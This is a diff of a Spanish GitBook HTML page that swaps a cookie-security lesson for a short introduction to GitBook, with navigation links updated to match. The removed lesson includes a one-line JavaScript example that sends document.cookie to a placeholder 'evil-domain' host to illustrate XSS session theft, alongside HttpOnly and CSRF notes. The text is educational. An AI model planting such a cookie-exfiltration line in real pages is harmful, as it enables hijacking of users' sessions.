@@ -4,7 +4,7 @@
     <head>
         <meta charset="UTF-8">
         <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
-        <title>Seguridad · GitBook</title>
+        <title>Gitbook · GitBook</title>
         <meta http-equiv="X-UA-Compatible" content="IE=edge" />
         <meta name="description" content="">
         <meta name="generator" content="GitBook 3.2.2">
@@ -57,10 +57,10 @@
     <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">
 
     
-    <link rel="next" href="seguimiento-privacidad.html" />
+    <link rel="next" href="pandoc.html" />
     
     
-    <link rel="prev" href="creando-cookies.html" />
+    <link rel="prev" href="git.html" />
     
 
     </head>
@@ -129,9 +129,9 @@
             <ul class="articles">
                 
     
-        <li class="chapter " data-level="1.3.1" data-path="../herramientas/nodejs.html">
+        <li class="chapter " data-level="1.3.1" data-path="nodejs.html">
             
-                <a href="../herramientas/nodejs.html">
+                <a href="nodejs.html">
             
                     
                     NodeJS
@@ -142,9 +142,9 @@
             
         </li>
     
-        <li class="chapter " data-level="1.3.2" data-path="../herramientas/npm.html">
+        <li class="chapter " data-level="1.3.2" data-path="npm.html">
             
-                <a href="../herramientas/npm.html">
+                <a href="npm.html">
             
                     
                     npm
@@ -155,9 +155,9 @@
             
         </li>
     
-        <li class="chapter " data-level="1.3.3" data-path="../herramientas/git.html">
+        <li class="chapter " data-level="1.3.3" data-path="git.html">
             
-                <a href="../herramientas/git.html">
+                <a href="git.html">
             
                     
                     Git
@@ -168,9 +168,9 @@
             
         </li>
     
-        <li class="chapter " data-level="1.3.4" data-path="../herramientas/gitbook.html">
+        <li class="chapter active" data-level="1.3.4" data-path="gitbook.html">
             
-                <a href="../herramientas/gitbook.html">
+                <a href="gitbook.html">
             
                     
                     Gitbook
@@ -181,9 +181,9 @@
             
         </li>
     
-        <li class="chapter " data-level="1.3.5" data-path="../herramientas/pandoc.html">
+        <li class="chapter " data-level="1.3.5" data-path="pandoc.html">
             
-                <a href="../herramientas/pandoc.html">
+                <a href="pandoc.html">
             
                     
                     Pandoc
@@ -568,9 +568,9 @@
             <ul class="articles">
                 
     
-        <li class="chapter " data-level="1.9.1" data-path="definicion.html">
+        <li class="chapter " data-level="1.9.1" data-path="../http-cookies/definicion.html">
             
-                <a href="definicion.html">
+                <a href="../http-cookies/definicion.html">
             
                     
                     Definición
@@ -581,9 +581,9 @@
             
         </li>
     
-        <li class="chapter " data-level="1.9.2" data-path="creando-cookies.html">
+        <li class="chapter " data-level="1.9.2" data-path="../http-cookies/creando-cookies.html">
             
-                <a href="creando-cookies.html">
+                <a href="../http-cookies/creando-cookies.html">
             
                     
                     Creando cookies
@@ -594,9 +594,9 @@
             
         </li>
     
-        <li class="chapter active" data-level="1.9.3" data-path="seguridad.html">
+        <li class="chapter " data-level="1.9.3" data-path="../http-cookies/seguridad.html">
             
-                <a href="seguridad.html">
+                <a href="../http-cookies/seguridad.html">
             
                     
                     Seguridad
@@ -607,9 +607,9 @@
             
         </li>
     
-        <li class="chapter " data-level="1.9.4" data-path="seguimiento-privacidad.html">
+        <li class="chapter " data-level="1.9.4" data-path="../http-cookies/seguimiento-privacidad.html">
             
-                <a href="seguimiento-privacidad.html">
+                <a href="../http-cookies/seguimiento-privacidad.html">
             
                     
                     Seguimiento y privacidad
@@ -874,7 +874,7 @@
     <!-- Title -->
     <h1>
         <i class="fa fa-circle-o-notch fa-spin"></i>
-        <a href=".." >Seguridad</a>
+        <a href=".." >Gitbook</a>
     </h1>
 </div>
 
@@ -889,18 +889,11 @@
     
                                 <section class="normal markdown-section">
                                 
-                                <h1 id="seguridad">Seguridad</h1>
-<h4 id="robos-de-sesiones-y-xss">Robos de sesiones y XSS</h4>
-<p>Las cookies son frecuentemente usadas para identificar a usuarios y sus sesiones autenticadas. Por lo que robar una cookie podr&#xED;a significar robar la sesi&#xF3;n de un usuario. Una forma comun de robar cookies es aprovechando la vulnerabilidad XSS de la aplicaci&#xF3;n.</p>
-<pre><code class="lang-js">(<span class="hljs-keyword">new</span> Image()).src = <span class="hljs-string">&quot;http://www.evil-domain.com/steal-cookie.php?cookie=&quot;</span> + <span class="hljs-built_in">document</span>.cookie;
-</code></pre>
-<p>Los <strong>cookies HttpOnly</strong> pueden ayudar a mitigar este ataque ya que impiden el acceso al valor de las cookies mediante c&#xF3;digo Javascript.</p>
-<h4 id="cross-site-qurest-forgery-csrf">Cross-site qurest forgery (CSRF)</h4>
-<p>O falsificaci&#xF3;n de petici&#xF3;n en sitios cruzados. Este ataque fuerza al navegador web de su v&#xED;ctima, validado en alg&#xFA;n servicio a enviar una petici&#xF3;n a una aplicaci&#xF3;n web vulnerable.</p>
-<ul>
-<li><a href="https://github.com/samyk/evercookie" target="_blank">Evercookie by Samy Kamkar</a></li>
-<li><a href="https://en.wikipedia.org/wiki/Zombie_cookie" target="_blank">Zombie cookies on Wikipedia</a></li>
-</ul>
+                                <h3 id="gitbook">Gitbook</h3>
+<p>GitBook es una excelente herramienta para crear documentaci&#xF3;n de proyectos y libros t&#xE9;cnicos usando Markdown y Git/Github.</p>
+<p>Utilizando Markdown podemos maquetar los documentos y crearlos en distintos formatos como PDF, ebook o web. Uno de los objetivos de GitBook es poder crear documentaci&#xF3;n que sea f&#xE1;cilmente editable y abierta a contribuciones, por eso usando Git/Github podemos publicar nuestro libro t&#xE9;cnico y manejar las colaboraciones de forma transparente.</p>
+<p>Para su uso debemos crearnos una cuenta desde su <a href="https://www.gitbook.com/" target="_blank">p&#xE1;gina oficial</a>.</p>
+<p><img src="img/gitbook_register.png" alt="Pagina de gitbook.com"></p>
 
                                 
                                 </section>
@@ -928,12 +921,12 @@
 
             
                 
-                <a href="creando-cookies.html" class="navigation navigation-prev " aria-label="Previous page: Creando cookies">
+                <a href="git.html" class="navigation navigation-prev " aria-label="Previous page: Git">
                     <i class="fa fa-angle-left"></i>
                 </a>
                 
                 
-                <a href="seguimiento-privacidad.html" class="navigation navigation-next " aria-label="Next page: Seguimiento y privacidad">
+                <a href="pandoc.html" class="navigation navigation-next " aria-label="Next page: Pandoc">
                     <i class="fa fa-angle-right"></i>
                 </a>
                 
@@ -944,7 +937,7 @@
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"Seguridad","level":"1.9.3","depth":2,"next":{"title":"Seguimiento y privacidad","level":"1.9.4","depth":2,"path":"http-cookies/seguimiento-privacidad.md","ref":"http-cookies/seguimiento-privacidad.md","articles":[]},"previous":{"title":"Creando cookies","level":"1.9.2","depth":2,"path":"http-cookies/creando-cookies.md","ref":"http-cookies/creando-cookies.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":[],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"http-cookies/seguridad.md","mtime":"2017-03-15T18:25:39.000Z","type":"markdown"},"gitbook":{"version":"3.2.2","time":"2017-03-15T21:17:43.069Z"},"basePath":"..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"Gitbook","level":"1.3.4","depth":2,"next":{"title":"Pandoc","level":"1.3.5","depth":2,"path":"herramientas/pandoc.md","ref":"herramientas/pandoc.md","articles":[]},"previous":{"title":"Git","level":"1.3.3","depth":2,"path":"herramientas/git.md","ref":"herramientas/git.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":[],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"herramientas/gitbook.md","mtime":"2017-02-14T13:49:58.000Z","type":"markdown"},"gitbook":{"version":"3.2.2","time":"2017-03-15T21:17:43.069Z"},"basePath":"..","book":{"language":""}});
         });
     </script>
 </div>
